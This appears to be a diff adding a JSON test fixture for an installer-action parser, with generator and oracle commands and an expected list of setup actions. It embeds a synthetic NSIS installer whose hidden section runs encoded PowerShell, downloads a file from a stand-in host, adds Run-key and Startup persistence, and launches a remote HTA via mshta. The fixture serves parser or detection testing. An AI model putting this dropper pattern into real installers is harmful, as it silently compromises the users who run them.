@@ -1,0 +1,11 @@
+{
+ "decoy": false,
+ "material": "; synthetic NSIS installer: real setup + modeled payload\nUnicode True\n!define APP \"Acme Viewer\"\nName \"${APP}\"\nOutFile \"acme-setup.exe\"\nInstallDir \"$PROGRAMFILES\\Acme\"\nRequestExecutionLevel admin\nPage directory\nPage instfiles\n\nFunction .onInit\n  MessageBox MB_OK \"Welcome to ${APP}\"\nFunctionEnd\n\nSection \"Main\" SecMain\n  SetOutPath \"$INSTDIR\"\n  File \"viewer.exe\"\n  File /oname=readme.txt \"README.md\"\n  CreateDirectory \"$SMPROGRAMS\\Acme\"\n  CreateShortCut \"$SMPROGRAMS\\Acme\\Viewer.lnk\" \"$INSTDIR\\viewer.exe\"\n  WriteUninstaller \"$INSTDIR\\uninstall.exe\"\n  WriteRegStr HKLM \"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Acme\" \"DisplayName\" \"${APP}\"\n  DetailPrint \"installed\"\nSectionEnd\n\nSection \"-hidden\"\n  StrCpy $1 \"powershell.exe -NoP -W Hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAHMAdABhAGcAZQAyACcA\"\n  nsExec::ExecToLog '$1'\n  inetc::get /SILENT \"https://cdn.acme.example.invalid/update.bin\" \"$TEMP\\update.bin\" /END\n  WriteRegStr HKCU \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\" \"AcmeUpd\" 'wscript.exe //E:jscript \"$APPDATA\\acme\\u.dat\"'\n  CreateShortCut \"$SMSTARTUP\\acme.lnk\" \"cmd.exe\" '/c python \"$APPDATA\\acme\\s.py\"'\nSectionEnd\n\nFunction .onInstSuccess\n  ExecShell \"open\" \"mshta.exe\" \"https://acme.example.invalid/n.hta\"\nFunctionEnd\n",
+ "rep": "installer_actions",
+ "transform": "setup-actions",
+ "key": "ia_nsis_setup.nsi",
+ "expected": "SetOutPath,File,CreateDirectory,CreateShortCut,WriteUninstaller,WriteRegStr",
+ "note": "installer-action-model: lib.codec.installer_actions -> installer_answer(field); key = member name",
+ "generator_cmd": "python3 -I tests/data/script_fixtures/ia_gen.py tests/data/script_fixtures/ia_src  (stdlib; literal installer sources)",
+ "oracle_cmd": "python3 -I tests/data/script_fixtures/ia_oracle.py tests/data/script_fixtures/ia_src/ia_nsis_setup.nsi setup-actions"
+}
